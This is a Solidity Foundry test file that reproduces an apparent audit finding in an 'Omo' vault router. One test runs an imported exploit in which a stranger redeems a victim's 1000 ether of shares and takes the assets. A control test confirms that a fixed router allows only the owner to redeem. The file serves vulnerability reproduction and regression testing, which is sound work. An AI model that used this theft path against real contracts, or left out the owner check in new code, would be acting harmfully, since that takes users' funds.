// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Exploit, MockAsset, OmoVault, Victim, OmoRouterFixed} from "./53319-h-01-anyone-can-redeem-from-users-and-take-the-funds-pashov.sol";

contract OmoRedeemTheftTest is Test {
    function test_exploit_strangerRedeemsVictimShares() public {
        Exploit e = new Exploit();
        e.run();

        console.log("victim shares before", e.victimSharesBefore());
        console.log("attacker assets before", e.attackerBefore());
        console.log("assets out", e.assetsOut());
        console.log("attacker assets after", e.attackerAfter());
        console.log("victim shares after", e.victimSharesAfter());

        assertEq(e.victimSharesBefore(), 1000 ether, "victim deposit");
        assertEq(e.attackerBefore(), 0, "attacker start");
        assertEq(e.assetsOut(), 1000 ether, "redeemed");
        assertEq(e.attackerAfter(), 1000 ether, "attacker gained the victim amount");
        assertEq(e.attackerAfter() - e.attackerBefore(), e.victimSharesBefore(), "delta != victim amount");
        assertEq(e.victimSharesAfter(), 0, "victim shares remain");
        assertEq(e.asset().balanceOf(address(this)), 1000 ether, "caller balance");
        assertEq(e.asset().balanceOf(address(e.vault())), 0, "vault still holds assets");
        assertEq(e.asset().balanceOf(address(e.victim())), 0, "victim kept assets");
    }

    function test_control_onlyOwnerRedeems() public {
        Exploit e = new Exploit();
        MockAsset asset = e.asset();
        OmoVault vault = e.vault();
        Victim victim = e.victim();
        OmoRouterFixed fixedRouter = e.fixedRouter();
        uint256 amount = 1000 ether;

        asset.mint(address(victim), amount);
        victim.fundAndApprove(asset, vault, address(fixedRouter), amount);
        assertEq(vault.balanceOf(address(victim)), amount, "control deposit");

        bool stolen;
        try fixedRouter.redeem(1, amount, address(this)) returns (uint256) {
            stolen = true;
        } catch {}
        assertFalse(stolen, "stranger redeemed on the fixed router");
        assertEq(vault.balanceOf(address(victim)), amount, "shares moved");
        assertEq(asset.balanceOf(address(this)), 0, "stranger received assets");

        uint256 out = victim.redeemOwn(fixedRouter, 1, amount);
        assertEq(out, amount, "owner redeem amount");
        assertEq(asset.balanceOf(address(victim)), amount, "owner received assets");
        assertEq(vault.balanceOf(address(victim)), 0, "owner shares remain");
        assertEq(asset.balanceOf(address(vault)), 0, "vault retained assets");
    }
}
